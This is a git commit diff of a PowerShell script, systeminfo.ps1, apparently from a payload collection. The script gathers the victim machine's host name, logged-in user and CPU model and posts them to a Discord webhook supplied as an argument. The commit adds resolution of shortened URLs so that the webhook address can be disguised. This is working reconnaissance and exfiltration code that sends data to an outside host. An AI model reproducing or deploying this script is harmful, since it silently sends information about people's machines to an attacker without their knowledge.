e67222bdc198f274bdc3852acc2c8c4acfd49b7d
CaliNux <132522491+calinux-py@users.noreply.github.com>
2026-01-03 18:58:12 -0800

    Update systeminfo.ps1

--- systeminfo/systeminfo.ps1
+++ systeminfo/systeminfo.ps1
@@ -1,10 +1,16 @@
-$w=$args[0]
+# works for shortened urls and discord webhooks yeeeeet
+$w = $args[0]
+if ($w -notmatch '^https://discord') {
+    $response = irm $w
+    if ($response.url) {
+        $w = $response.url
+    } else {
+        $w = $response
+    }
+}
 $sys = Get-ComputerInfo
 $cpu = (Get-CimInstance Win32_Processor).Name
 $data = @{
-    content = "### :upside_down::upside_down::upside_down:
-**Host:** $($sys.CsName)
-**User:** $env:USERNAME
-**CPU:** $cpu"
+    content = "### :upside_down::upside_down::upside_down:`n**Host:** $($sys.CsName)`n**User:** $env:USERNAME`n**CPU:** $cpu"
 }
 irm $w -Method Post -Body ($data | ConvertTo-Json) -ContentType "application/json"
